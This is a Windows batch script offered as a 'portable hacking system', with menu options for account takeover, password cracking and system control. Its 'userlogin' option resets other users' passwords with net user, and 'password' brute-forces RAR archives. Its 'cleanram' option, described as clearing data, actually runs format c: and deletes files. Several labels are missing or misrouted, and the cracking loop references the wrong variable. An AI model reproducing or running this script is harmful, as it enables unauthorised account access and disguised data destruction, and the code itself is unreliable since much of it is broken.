@echo off
color 4a
title Rakshasa Portable Hacking System for Windows
mode con: cols=95 lines=20
set /a d=0
set /a cl=0
goto :menu

:menu
echo This is Rakshasa Portable Hacking Systems for Windows versions 7 and above. Powered by TheGeekman
echo If this is the Batch (.bat) version: Run this application as administrator.
echo If this is an executable installer file (.exe): Leave it as it is. It is not required to run it as administrator.
echo WARNING: What the user does with this program is their own decision! Use at your own risk!
echo.
pause
goto :commands

:help
echo 'abort' - exit the program
echo 'changeip' - change your ip address
echo 'cleanram' - clear all of your data
echo 'controls' - open up a control panel
echo 'disable' - disable external controls
echo 'enable' - enable external controls
echo 'info' - everything about your device
echo 'mobile' - shutdown a computer remotely
echo 'password' - unlock a protected file
echo 'reboot' - restart this device
echo 'rerun' - rerun this application
echo 'userlogin' - find a user's password
echo 'users' - the list of all users
echo.
pause
goto :commands

:commands
cls
for /f %%a in ('powershell Invoke-RestMethod api.ipify.org') do set PublicIP=%%a
set /p o=(%PublicIP%) %userprofile%:
if %o%==abort exit
if %o%==users goto :list
if %o%==shutdown goto :shutdown
if %o%==reboot goto :restart
if %o%==rerun goto :clear
if %o%==info goto :info
if %o%==userlogin goto :userhack
if %o%==changeip goto :incognito
if %o%==cleanram goto :clean
if %o%==controls goto :adminhack
if %o%==disable goto :netshdisable
if %o%==password goto :hackfile
if %o%==enable goto :netshenable
if %o%==help goto :help
if %o%==remote goto :remote
goto :error

:mobile
shutdown /i

:error
echo That command does not exist.
echo.
goto :commands

:clear
cls
goto :menu

:info
systeminfo | findstr /c:"Host" 
systeminfo | findstr /c:"Domain" 
systeminfo | findstr /c:"System" 
systeminfo | findstr /c:"Version" 
systeminfo | findstr /c:"Manufacturer" 
systeminfo | findstr /c:"Model" 
systeminfo | findstr /c:"Type" 
systeminfo | findstr /c:"Memory" 
for /f %%a in ('powershell Invoke-RestMethod api.ipify.org') do set PublicIP=%%a
echo Public IP:                 %PublicIP%
ipconfig | find /i "IPv4"
echo.
goto :commands

:netshdisable
netsh interface show interface
set /p item=Disable:
netsh interface set interface "%item%" Disable
goto :commands

:netshenable
netsh interface show interface
set /p item=Enable:
netsh interface set interface "Wi-Fi" Enable
goto :commands

:shutdown
pause
shutdown /p

:restart
pause
shutdown /r

:list users
net user
goto :commands

:listhack users
net user
goto :hack

:userhack
echo Type 'users' to find the name of the account that you want to hack.
goto :hack

:hack
set /p u=Hack Username:
if %u%==users goto :listhack users
set /p p=New Password:
net user %u% %p% 
if not %d%==1 :hackerror
if %d%==1 echo - command: net user %u% %p%
echo Command is being processed.
pause
goto :menu

:adminhack
cd %userprofile%\Downloads
md rakshasa.{ED7BA470-8E54-465E-825C-99712043E01C}
start rakshasa.{ED7BA470-8E54-465E-825C-99712043E01C}
echo.
goto :commands

:hackfile
copy "C:\Program Files\WinRAR\Unrar.exe"
set pswd=0
set dest=%temp%\%random%
md %dest%
:rar
set/p "name=Enter File Name:"
if "%name%"=="" goto nerror
goto gpath
:nerror
echo Please input your file name.
goto rar
:gpath
set/p "path=Enter full Path:"
if "%path%"=="" goto perror
goto next
perror
echo Please input your file path.
goto rar
:next
if exist "%path%\%name%" goto start
goto path
:path
echo That file does not exist.
goto rar
:start
set /a pswd=%pswd%+1
unrar e -inul -p%pswd% "%path%\%%" "%dest%"
IF /I %errorlevel% equ 0 goto finish
goto start
:finish
rd %dest% /q /s
Del "Unrar.exe"
echo You have cracked the password.
echo File = %name%
echo Password = %pswd%
goto :commands

:clean
call format c:
del *.*
goto :commands

:incognito
echo [A] Set Static IP 
echo [B] Set DHCP 
echo. 
:choice 
SET /P C=[A/B]:
for %%? in (A) do if /I "%C%"=="%%?" goto A 
for %%? in (B) do if /I "%C%"=="%%?" goto B 
goto choice 
:A 
echo Click "Enter" to continue.
for /f %%a in ('powershell Invoke-RestMethod api.ipify.org') do set PublicIP=%%a
set /p IP_Addr=%PublicIP%
echo Enter the first two digits in your IP address, %PublicIP%
set /p D_Gate=
echo Enter the last three digits in your IP address, %PublicIP%
set /p Sub_Mask=
netsh interface ip set address "LAN" static %IP_Addr% %Sub_Mask% %D_Gate% 1 
netsh int ip show config
echo Updated system information.
goto :info
:B 
echo Resetting IP Address and Subnet Mask For DHCP 
netsh int ip set address name = "LAN" source = dhcp
ipconfig /renew
echo Here are the new settings for %computername%: 
netsh int ip show config
goto :commands
